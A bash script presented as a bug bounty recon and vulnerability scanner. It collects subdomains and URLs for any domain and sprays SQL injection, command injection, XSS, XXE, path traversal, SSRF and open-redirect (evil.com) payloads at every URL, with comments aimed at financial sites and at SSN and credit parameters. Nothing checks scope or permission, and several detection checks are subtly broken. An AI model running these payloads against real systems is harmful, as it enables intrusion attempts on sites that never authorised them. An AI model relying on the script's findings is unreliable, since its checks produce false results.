#!/bin/bash

# Complete Bug Bounty Recon & Vulnerability Scan Script
# Author: @YourHandleHere
# Version: 1.3

# === Configuration ===
if [ -z "$1" ]; then
    echo "Usage: $0 <domain>"
    exit 1
fi

domain=$1
output_dir="recon_scan_$domain"
mkdir -p $output_dir

rate_limit="75"  # Conservative RPM for financial targets

# === 1. Subdomain Enumeration ===
echo "[+] Enumerating subdomains..."
{
    subfinder -d $domain -silent
    assetfinder --subs-only $domain
    curl -s "https://crt.sh/?q=%25.$domain&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g'
} | sort -u > $output_dir/all_subs.txt

# === 2. Live Subdomains ===
echo "[+] Probing for live subdomains..."
cat $output_dir/all_subs.txt | httpx -silent -threads 20 -rate-limit $rate_limit -status-code -title -tech-detect -json -o $output_dir/live.json
jq -r '.url' $output_dir/live.json > $output_dir/live.txt

# === 3. URL Collection ===
echo "[+] Collecting historical URLs..."
{
    cat $output_dir/live.txt | waybackurls
    cat $output_dir/live.txt | gau --threads 20 --subs
    katana -list $output_dir/live.txt -jc -kf all -d 3 -silent -o $output_dir/katana.txt
} | sort -u > $output_dir/all_urls.txt

# === 4. Parameter Discovery ===
echo "[+] Extracting parameters..."
{
    paramspider -d $domain -o $output_dir/paramspider.txt
    cat $output_dir/all_urls.txt | grep "=" | unfurl -u keys
    cat $output_dir/all_urls.txt | grep "=" | unfurl -u keypairs
} | sort -u > $output_dir/urls_with_params.txt

# === 5. IDOR Detection ===
echo "[+] Searching for IDOR-prone parameters..."
{
    cat $output_dir/urls_with_params.txt | grep -Ei 'id=|user=|account=|uid=|profile=|order=|number=|customer=|client='
    cat $output_dir/urls_with_params.txt | grep -Ei 'ssn=|credit=|score=|report=|birth=|dob=|address='
} | sort -u > $output_dir/idor_candidates.txt

# === 6. SSRF Detection ===
echo "[+] Scanning for SSRF vulnerabilities..."
cat $output_dir/all_urls.txt | grep -i "url=" | while read url; do
    payload="http://127.0.0.1:80"
    response=$(curl -X GET -d "url=$payload" -s "$url")
    if echo "$response" | grep -i "root:"; then
        echo "$url is vulnerable to SSRF" >> $output_dir/ssrf_candidates.txt
    fi
done

# === 7. Command Injection Detection ===
echo "[+] Scanning for Command Injection vulnerabilities..."
cat $output_dir/all_urls.txt | while read url; do
    payload="; ls"
    response=$(curl -X GET -d "input=$payload" -s "$url")
    if echo "$response" | grep -i "bin" || echo "$response" | grep -i "ls"; then
        echo "$url is vulnerable to Command Injection" >> $output_dir/command_injection_candidates.txt
    fi
done

# === 8. SQL Injection Detection ===
echo "[+] Scanning for SQL Injection vulnerabilities..."
cat $output_dir/all_urls.txt | while read url; do
    payload="' OR 1=1 -- "
    response=$(curl -X GET -d "input=$payload" -s "$url")
    if echo "$response" | grep -i "error" || echo "$response" | grep -i "syntax"; then
        echo "$url is vulnerable to SQL Injection" >> $output_dir/sql_injection_candidates.txt
    fi
done

# === 9. Reflected XSS Detection ===
echo "[+] Scanning for Reflected XSS vulnerabilities..."
cat $output_dir/all_urls.txt | while read url; do
    payload="<script>alert('XSS')</script>"
    response=$(curl -X GET -d "input=$payload" -s "$url")
    if echo "$response" | grep -i "XSS"; then
        echo "$url is vulnerable to Reflected XSS" >> $output_dir/xss_candidates.txt
    fi
done

# === 10. Open Redirect Detection ===
echo "[+] Scanning for Open Redirect vulnerabilities..."
cat $output_dir/all_urls.txt | grep -i "redirect=" | while read url; do
    payload="http://evil.com"
    response=$(curl -X GET -d "redirect=$payload" -s "$url")
    if echo "$response" | grep -i "evil.com"; then
        echo "$url is vulnerable to Open Redirect" >> $output_dir/open_redirect_candidates.txt
    fi
done

# === 11. CSRF Detection ===
echo "[+] Scanning for CSRF vulnerabilities..."
cat $output_dir/all_urls.txt | while read url; do
    csrf_token=$(curl -s "$url" | grep -oP 'name="csrf_token" value="\K[^"]+')
    if [ -z "$csrf_token" ]; then
        echo "$url might be vulnerable to CSRF" >> $output_dir/csrf_candidates.txt
    fi
done

# === 12. Directory Traversal Detection ===
echo "[+] Scanning for Directory Traversal vulnerabilities..."
cat $output_dir/all_urls.txt | while read url; do
    payload="../etc/passwd"
    response=$(curl -X GET -d "input=$payload" -s "$url")
    if echo "$response" | grep -i "root:"; then
        echo "$url is vulnerable to Directory Traversal" >> $output_dir/directory_traversal_candidates.txt
    fi
done

# === 13. XML External Entity (XXE) Detection ===
echo "[+] Scanning for XXE vulnerabilities..."
cat $output_dir/all_urls.txt | while read url; do
    payload="<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
    response=$(curl -X POST -d "xml=$payload" -s "$url")
    if echo "$response" | grep -i "root:"; then
        echo "$url is vulnerable to XXE" >> $output_dir/xxe_candidates.txt
    fi
done

# === 14. Fuzzing ===
echo "[+] Starting focused fuzzing..."
mkdir -p $output_dir/ffuf
for url in $(cat $output_dir/live.txt); do
    domain_clean=$(echo $url | sed 's/https\?:\/\///g' | tr "/" "_")
    
    # Focus on financial-related endpoints
    ffuf -u "$url/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/financial.txt \
        -t 20 -rate $rate_limit -o "$output_dir/ffuf/${domain_clean}_financial.json" -of json
    
    # Standard small wordlist for general coverage
    ffuf -u "$url/FUZZ" -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
        -t 20 -rate $rate_limit -o "$output_dir/ffuf/${domain_clean}_general.json" -of json
done

# === 15. Nuclei Targeted Scanning ===
echo "[+] Running targeted scans..."
{
    nuclei -l $output_dir/live.txt -t ~/nuclei-templates/financial/ -rate-limit $rate_limit
    nuclei -l $output_dir/live.txt -t ~/nuclei-templates/authentication/ -rate-limit $rate_limit
    nuclei -l $output_dir/live.txt -t ~/nuclei-templates/api/ -rate-limit $rate_limit
} > $output_dir/nuclei_results.txt

# === 16. API Endpoint Discovery ===
echo "[+] Identifying API endpoints..."
cat $output_dir/all_urls.txt | grep -i "api" > $output_dir/api_endpoints.txt
cat $output_dir/live.json | jq -r 'select(.tech_detect | contains("api")) | .url' >> $output_dir/api_endpoints.txt

# === 17. Report Generation ===
echo "[+] Generating summary report..."
{
    echo "Complete Bug Bounty Recon Report for $domain"
    echo "Generated on $(date)"
    echo ""
    echo "=== Summary ==="
    echo "Subdomains found: $(wc -l < $output_dir/all_subs.txt)"
    echo "Live hosts: $(wc -l < $output_dir/live.txt)"
    echo "URLs collected: $(wc -l < $output_dir/all_urls.txt)"
    echo "Parameters found: $(wc -l < $output_dir/urls_with_params.txt)"
    echo "IDOR candidates: $(wc -l < $output_dir/idor_candidates.txt)"
    echo "SSRF candidates: $(wc -l < $output_dir/ssrf_candidates.txt)"
    echo "Command Injection candidates: $(wc -l < $output_dir/command_injection_candidates.txt)"
    echo "SQL Injection candidates: $(wc -l < $output_dir/sql_injection_candidates.txt)"
    echo "Reflected XSS candidates: $(wc -l < $output_dir/xss_candidates.txt)"
    echo "Open Redirect candidates: $(wc -l < $output_dir/open_redirect_candidates.txt)"
    echo "CSRF candidates: $(wc -l < $output_dir/csrf_candidates.txt)"
    echo "Directory Traversal candidates: $(wc -l < $output_dir/directory_traversal_candidates.txt)"
    echo "XXE candidates: $(wc -l < $output_dir/xxe_candidates.txt)"
    echo "API endpoints: $(wc -l < $output_dir/api_endpoints.txt)"
} > $output_dir/report.txt

echo "[+] Recon complete. All data saved in $output_dir/"
